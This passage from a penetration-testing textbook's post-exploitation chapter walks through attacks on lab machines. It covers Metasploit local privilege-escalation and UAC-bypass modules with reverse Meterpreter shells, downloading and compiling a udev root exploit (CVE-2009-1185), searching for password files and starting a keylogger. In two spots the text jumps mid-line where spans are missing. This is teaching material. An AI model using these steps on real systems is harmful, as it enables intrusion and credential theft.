--snip--
[*] Writing 290 bytes at address 0x00f70000
[*] Sending stage (751104 bytes) to 192.168.20.10
[*] Restoring the original token...
[*] Meterpreter session 4 opened (192.168.20.9:4444 -> 192.168.20.10:1108) at
2015-08-14 01:59:46 -0400
meterpreter >
Listing 13-8: Metasploit local exploit
After you enter exploit, Metasploit runs the exploit in our Windows XP
session. If it succeeds, you should receive another Meterpreter session. If
you run getuid on this new session, you should see that you’ve once again
obtained System privileges.
note Remember, to succeed, local privilege-escalation attacks rely on a flaw such as a
missing patch or security misconfiguration. A fully updated and locked-down system
would not be vulnerable to the MS11-08 exploit because a vendor patch was released
in 2011.
Bypassing UAC on Windows
Now let’s see how to escalate our privileges on our more secure Windows 7
target, which has additional security features including user account control
(UAC). Applications running on Windows Vista and higher are limited to
using regular user privileges. If an application needs to use administra-
tive privileges, an administrative user has to approve the elevation. (You’ve
probably seen the warning notice from UAC when an application wants to
make changes.)
Because we gained this session by having user Georgia Weidman run
a malicious binary, the Meterpreter session currently has the privileges
of Georgia Weidman. Try using getsystem against this target, as shown in
Listing 13-9.
msf exploit(ms11_080_afdjoinleaf) > sessions -i 2
[*] Starting interaction with 2...
meterpreter > getuid
Post Exploitation 285
Server username: Book-Win7\Georgia Weidman
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: Access is denied.
Listing 13-9: getsystem fails on Windows 7
As you can see, running getsystem against this target fails and gives an
error message. Perhaps this system is fully patched and hardened to the
point where none of the exploitation techniques in getsystem will work.
But as it turns out, our Windows 7 target has not been patched since
installation; UAC is stopping getsystem from working properly.
As with any computer security control, researchers have developed mul-
tiple techniques to bypass the UAC control. One such technique is included
in Metasploit in the local exploit windows/local/bypassuac. Background
the session and run this exploit on your Windows 7 session, as shown in
Listing 13-10. Use the exploit module, set the SESSION option, and so on.
msf exploit(ms11_080_afdjoinleaf) > use exploit/windows/local/bypassuac
msf exploit(bypassuac) > show options
Module options (exploit/windows/local/bypassuac):
Name Current Setting Required Description
---- --------------- -------- -----------
SESSION yes The session to run this module
msf exploit(bypassuac) > set SESSION 2
SESSION => 2
msf exploit(bypassuac) > exploit
[*] Started reverse handler on 192.168.20.9:4444
[*] UAC is Enabled, checking level...
--snip--
[*] Uploaded the agent to the filesystem....
[*] Sending stage (751104 bytes) to 192.168.20.12
[*] Meterpreter session 5 opened (192.168.20.9:4444 -> 192.168.20.12:49265) at
2015-08-14 02:17:05 -0400
[-] Exploit failed: Rex::TimeoutError Operation timed out. u
meterpreter > getuid
Server username: Book-Win7\Georgia Weidman
Listing 13-10: Using a module to bypass the UAC control
The module uses a trusted publisher certificate through process injec-
tion to bypass the UAC controls. As you can see from the results of the
getuid command, though our new session is still running as user Georgia
Weidman, we’re no longer restricted by UAC. If it was successful you will
again be presented with a new session. Don’t worry if you see the line at u.
As long as the new Meterpreter session opens, the attack was successful.
As shown next, having gotten UAC out of the way, getsystem has no
trouble gaining system privileges.
286 Chapter 13
meterpreter > getsystem
...got system (via technique 1).
Udev Privilege Escalation on Linux
We have yet to try privilege escalation on our Linux target. Let’s mix things
up a bit and use public exploit code instead of Metasploit to perform a local
privilege-escalation attack on Linux.
We have two ways to interact with our Linux target: via SSH and by
using the TikiWiki to gain a Meterpreter shell. The Linux Meterpreter has
fewer available commands than Windows Meterpreter, but in both cases we
use the shell command to drop out of Meterpreter and into a regular com-
mand shell, as shown in Listing 13-11.
meterpreter > shell
Process 13857 created.
Channel 0 created.
whoami
www-data
Listing 13-11: Dropping to a shell in Meterpreter
We see that our TikiWiki exploit gained us a session as the user
www-data, a limited account for the web server, but we have a long way to
get to root. We have also gained a Bash shell as the user georgia through
SSH in Chapter 8 with more privileges than www-data, but we’re still not
the coveted root.
Finding a Vulnerability
We need to find a local privilege-escalation vulnerability to exploit. First, we
need a bit of information about the local system, such as the version of the
installed kernel and the Ubuntu version. You can find out the Linux kernel
version with the command uname -a and the Ubuntu release version with the
command lsb_release -a, as shown in Listing 13-12.
uname -a
Linux ubuntu 2.6.27-7-generic #1 SMP Fri Oct 24 06:42:44 UTC 2008 i686 GNU/Linux
lsb_release -a
Distributor ID: Ubuntu
Description: Ubuntu 8.10
Release: 8.10
Codename: intrepid
Listing 13-12: Gathering local information
The Linux target is running Linux kernel 2.6.27-2 and Ubuntu 8.10,
codename Intrepid. This Linux system is a bit out of date and is vulnerable
Post Exploitation 287
to multiple known privilege-escalation issues. We’ll focus on an issue in
udev, the device manager for the Linux kernel that is in charge of loading
device drivers, or software that facilitates control of a device.
Vulnerability CVE-2009-1185 describes an issue in udev where the
daemon, which runs with root privileges, fails to check whether requests to
load drivers originate from the kernel. Processes in user space, such as ones
that a user starts, can send messages to udev and convince it to run code
with root privileges.
According to the SecurityFocus.com entry for this vulnerability, Ubuntu
8.10 is an affected platform, and further digging reveals that udev versions
141 and earlier are affected by this issue. We can check the udev version on
our target with the command udevadm --version, but we can’t run the com-
mand with the privileges afforded by www-data. Instead, we need to run it
from our SSH shell as shown here.
georgia@ubuntu:~$ udevadm --version
124
The udev version on our target, 124, is earlier than 141, which tells us
that our Linux target is vulnerable.
Finding an Exploit
Kali Linux includes a local repository of public exploit code from Exploitdb
.com at /usr/share/exploitdb, which includes a utility called searchsploit that
we can use to search for useful code. For example, Listing 13-13 shows the
results of a search for exploits related to udev.
root@kali:~# /usr/share/exploitdb/searchsploit udev
Description Path
---------------------------------------------------------------------- ----------------------
Linux Kernel 2.6 UDEV Local Privilege Escalation Exploit /linux/local/8478.sh
Linux Kernel 2.6 UDEV ] 2,768 --.-K/s in 0s
2015-08-14 14:30:52 (271 MB/s) - `8572.c' saved [2768/2768]
Listing 13-15: Using wget to download a file
Now compile the exploit code with GCC on the Linux target as shown
here. Use the -o flag to specify an output file name for your compiled code.
Post Exploitation 289
georgia@ubuntu:~$ gcc -o exploit 8572.c
Now to find that udev netlink socket PID mentioned in the exploit’s
usage information (Listing 13-14) for our argument. The usage informa-
tion noted that the PID we need is listed in /proc/net/netlink. cat out the file,
as shown in Listing 13-16.
georgia@ubuntu:~$ cat /proc/net/netlink
sk Eth Pid Groups Rmem Wmem Dump Locks
f7a90e00 0 5574 00000111 0 0 00000000 2
da714400 0 6476 00000001 0 0 00000000 2
da714c00 0 4200780 00000000 0 0 00000000 2
--snip--
f7842e00 15 2468 00000001 0 0 00000000 2
f75d5c00 16 0 00000000 0 0 00000000 2
f780f600 18 0 00000000 0 0 00000000 2
Listing 13-16: The /proc/net/netlink file
There’s more than one PID listed, but we know that the PID we need is
usually the PID of the udev daemon minus 1. Look at the udev process with
the ps aux command, as shown here.
georgia@ubuntu:~$ ps aux | grep udev
root 2469 0.0 0.0 2452 980 ? S search -f *password*
Found 8 results...
c:\\WINDOWS\Help\password.chm (21891 bytes)
c:\\xampp\passwords.txt (362 bytes)
c:\\xampp\php\PEAR\Zend\Dojo\Form\Element\PasswordTextBox.php (1446 bytes)
c:\\xampp\php\PEAR\Zend\Dojo\View\Helper\PasswordTextBox.php (1869 bytes)
c:\\xampp\php\PEAR\Zend\Form\Element\Password.php (2383 bytes)
c:\\xampp\php\PEAR\Zend\View\Helper\FormPassword.php (2942 bytes)
c:\\xampp\phpMyAdmin\user_password.php (4622 bytes)
c:\\xampp\phpMyAdmin\libraries\display_change_password.lib.php (3467 bytes)
Listing 13-18: Using Meterpreter to look for files
Post Exploitation 291
Keylogging
Another way to gather information is to let the logged-in user give it to you,
so to speak. Meterpreter has a keylogger we can use to listen for keystrokes.
Perhaps the user is logging in to websites or other systems on the network
while our Meterpreter session is active. Start the keylogger on the Windows XP
Meterpreter session by entering keyscan_start, as shown here.
meterpreter > keyscan_start
Starting the keystroke sniffer...
note You will capture keystrokes only in your current context. For my example, I used my
original Windows XP session where I am the user georgia in the explorer.exe pro-
cess, and thus can sniff georgia’s keystrokes. Another interesting idea is to migrate
into the winlogon process, where you will see only login information that is typed—